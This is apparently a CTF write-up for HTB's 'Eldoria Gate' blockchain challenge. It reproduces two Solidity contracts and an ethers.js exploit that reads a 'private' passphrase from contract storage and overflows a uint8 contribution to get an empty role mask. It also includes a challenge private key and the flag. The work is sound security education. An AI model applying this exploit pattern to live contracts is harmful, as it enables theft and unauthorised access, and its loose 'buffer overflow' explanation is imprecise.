---
published: 2025-04-03
series: CyberApocalypse 2025
tags:
- Blockchain
title: Eldoria Gate

---

EldoriaGate is the third blockchain challenge for HTB’s CTF, it consist of two files:  
  
  

```Solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    Malakar 1b:22-28, Tales from Eldoria - Eldoria Gates
  
    "In ages past, where Eldoria's glory shone,
     Ancient gates stand, where shadows turn to dust.
     Only the proven, with deeds and might,
     May join Eldoria's hallowed, guiding light.
     Through strict trials, and offerings made,
     Eldoria's glory, is thus displayed."
  
                   ELDORIA GATES
             *_   _   _   _   _   _ *
     ^       | `_' `-' `_' `-' `_' `|       ^
     |       |                      |       |
     |  (*)  |     .___________     |  \^/  |
     | _<#>_ |    //           \    | _(#)_ |
    o+o \ / \0    ||   =====   ||   0/ \ / (=)
     0'\ ^ /\/    ||           ||   \/\ ^ /`0
       /_^_\ |    ||    ---    ||   | /_^_\
       || || |    ||           ||   | || ||
       d|_|b_T____||___________||___T_d|_|b
  
***/

import { EldoriaGateKernel } from "./EldoriaGateKernel.sol";

contract EldoriaGate {
    EldoriaGateKernel public kernel;

    event VillagerEntered(address villager, uint id, bool authenticated, string[] roles);
    event UsurperDetected(address villager, uint id, string alertMessage);
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        kernel = new EldoriaGateKernel(_secret);
    }

    function enter(bytes4 passphrase) external payable {
        bool isAuthenticated = kernel.authenticate(msg.sender, passphrase);
        require(isAuthenticated, "Authentication failed");

        uint8 contribution = uint8(msg.value);        
        (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution);
        string[] memory roles = getVillagerRoles(msg.sender);
        
        emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles);
    }

    function getVillagerRoles(address _villager) public view returns (string[] memory) {
        string[8] memory roleNames = [
            "SERF", 
            "PEASANT", 
            "ARTISAN", 
            "MERCHANT", 
            "KNIGHT", 
            "BARON", 
            "EARL", 
            "DUKE"
        ];

        (, , uint8 rolesBitMask) = kernel.villagers(_villager);

        uint8 count = 0;
        for (uint8 i = 0; i < 8; i++) {
            if ((rolesBitMask & (1 << i)) != 0) {
                count++;
            }
        }

        string[] memory foundRoles = new string[](count);
        uint8 index = 0;
        for (uint8 i = 0; i < 8; i++) {
            uint8 roleBit = uint8(1) << i; 
            if (kernel.hasRole(_villager, roleBit)) {
                foundRoles[index] = roleNames[i];
                index++;
            }
        }

        return foundRoles;
    }

    function checkUsurper(address _villager) external returns (bool) {
        (uint id, bool authenticated , uint8 rolesBitMask) = kernel.villagers(_villager);
        bool isUsurper = authenticated && (rolesBitMask == 0);
        emit UsurperDetected(
            _villager,
            id,
            "Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach."
        );
        return isUsurper;
    }
}
```

```Solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

contract EldoriaGateKernel {
    bytes4 private eldoriaSecret;
    mapping(address => Villager) public villagers;
    address public frontend;

    uint8 public constant ROLE_SERF     = 1 << 0;
    uint8 public constant ROLE_PEASANT  = 1 << 1;
    uint8 public constant ROLE_ARTISAN  = 1 << 2;
    uint8 public constant ROLE_MERCHANT = 1 << 3;
    uint8 public constant ROLE_KNIGHT   = 1 << 4;
    uint8 public constant ROLE_BARON    = 1 << 5;
    uint8 public constant ROLE_EARL     = 1 << 6;
    uint8 public constant ROLE_DUKE     = 1 << 7;
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        eldoriaSecret = _secret;
        frontend = msg.sender;
    }

    modifier onlyFrontend() {
        assembly {
            if iszero(eq(caller(), sload(frontend.slot))) {
                revert(0, 0)
            }
        }
        _;
    }

    function authenticate(address _unknown, bytes4 _passphrase) external onlyFrontend returns (bool auth) {
        assembly {
            let secret := sload(eldoriaSecret.slot)            
            auth := eq(shr(224, _passphrase), secret)
            mstore(0x80, auth)
            
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)
            
            let packed := sload(add(villagerSlot, 1))
            auth := mload(0x80)
            let newPacked := or(and(packed, not(0xff)), auth)
            sstore(add(villagerSlot, 1), newPacked)
        }
    }

    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
        assembly {
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)

            mstore(0x00, _unknown)
            id := keccak256(0x00, 0x20)
            sstore(villagerSlot, id)

            let storedPacked := sload(add(villagerSlot, 1))
            let storedAuth := and(storedPacked, 0xff)
            if iszero(storedAuth) { revert(0, 0) }

            let defaultRolesMask := ROLE_SERF
            roles := add(defaultRolesMask, _contribution)
            if lt(roles, defaultRolesMask) { revert(0, 0) }

            let packed := or(storedAuth, shl(8, roles))
            sstore(add(villagerSlot, 1), packed)
        }
    }

    function hasRole(address _villager, uint8 _role) external view returns (bool hasRoleFlag) {
        assembly {
            mstore(0x0, _villager)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x0, 0x40)
        
            let packed := sload(add(villagerSlot, 1))
            let roles := and(shr(8, packed), 0xff)
            hasRoleFlag := gt(and(roles, _role), 0)
        }
    }
}
```

The code looks quite lenghty but the challenge is acyally pretty straightforward, the important part is

```Solidity

    function enter(bytes4 passphrase) external payable {
        bool isAuthenticated = kernel.authenticate(msg.sender, passphrase);
        require(isAuthenticated, "Authentication failed");

        uint8 contribution = uint8(msg.value);        
        (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution);
        string[] memory roles = getVillagerRoles(msg.sender);
        
        emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles);
    }
```

We need to authenticate and have no village role, in order to authenticate we need to match 4 bytes that are written in a private variable, this is pretty easy as it was my first error when creating my own web3 challenge, private variables are actually posted on the network and readable by getting the bytes from an out-of-chain rcp caller, pretty easy 🤷‍♂️

In order to have an empty role we can use a buffer overflow from the offer value when manipulating the bytemask values in memory, in this way we can sum to the initial 0001 mask, if we sum 1111 we can obtain 10000, but given that only the first 4 bytes are read we get 0000, so an empty role

```Solidity
const provider = new ethers.providers.JsonRpcProvider('http://83.136.254.165:56320');
const wallet = new ethers.Wallet('0xe0bb1754ea3d18f8eb14af3d862c06b761972315ded7a4655046377058584a1a', provider);
const playerAddress = '0xFcfab3333d614C7D07c0E96F679720471b08FeB3';
const elddoriaGateAddress = '0xbEE7471413E1bD78679fd98a34789720d8230DA8';

const elddoriaGate = new ethers.Contract(elddoriaGateAddress, elddoriaGateAbi, wallet);

const check = async () => {
    const blockNumber = await provider.getBlockNumber();
    console.log(`Current block number: ${blockNumber}`);
    const playerBalance = await provider.getBalance(playerAddress);
    console.log(`Player balance: ${playerBalance}`);
    }

const getKernel = async () => {
    const kernelAddress = await elddoriaGate.kernel();
    const kernel = new ethers.Contract(kernelAddress, EldoriaGateKernelAbi, wallet);
    return kernel;
}

const enter = async () => {
    // const passphrase = ethers.utils.formatBytes32String('0xdeadbeef');
    const tx = await elddoriaGate.enter("0xdeadfade", {value: `${2 ** 16 + 256 -1}`, gasLimit: 10000000});
    await tx.wait();
}
const main  = async () => {
    await check();
    const kernel = await getKernel();
    const slot0Bytes = await provider.getStorageAt(kernel.address, 0);
    const slot1Bytes = await provider.getStorageAt(kernel.address, 1);
    const slot2Bytes = await provider.getStorageAt(kernel.address, 2);
    const slot3Bytes = await provider.getStorageAt(kernel.address, 3);
    console.log(slot0Bytes);
    console.log(slot1Bytes);
    console.log(slot2Bytes);
    console.log(slot3Bytes);
    await enter();

    const villager_roles = await elddoriaGate.getVillagerRoles(playerAddress);
    console.log(villager_roles);
    const checkUsurper = await elddoriaGate.checkUsurper(playerAddress);
    const tx = await elddoriaGate.checkUsurper(playerAddress);
    const receipt = await tx.wait();
    console.log(receipt);
}

main()
```

Took me actually a while to tape this together, I first deployed a local version of the code and tested the two parts individually, then I taped them together

```Solidity
HTB{unkn0wn_1ntrud3r_1nsid3_Eld0r1a_gates}
```